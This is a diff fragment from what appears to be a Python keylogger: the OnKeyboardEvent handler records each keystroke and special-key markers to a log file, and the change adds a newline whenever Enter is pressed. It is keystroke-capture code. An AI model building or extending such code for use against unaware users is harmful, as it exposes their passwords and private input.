@@ -49,6 +49,8 @@ def OnKeyboardEvent(event):
                 log_file.write(' ['+ event.Key +' down] ')
             if event.Ascii == 8 or event.Key == 'Delete':
                 special_key[2] = special_key[2] + 1
+            if event.Ascii == 13:
+                log_file.write('\n')
         else:
             print(chr(event.Ascii))
             log_file.write(chr(event.Ascii))
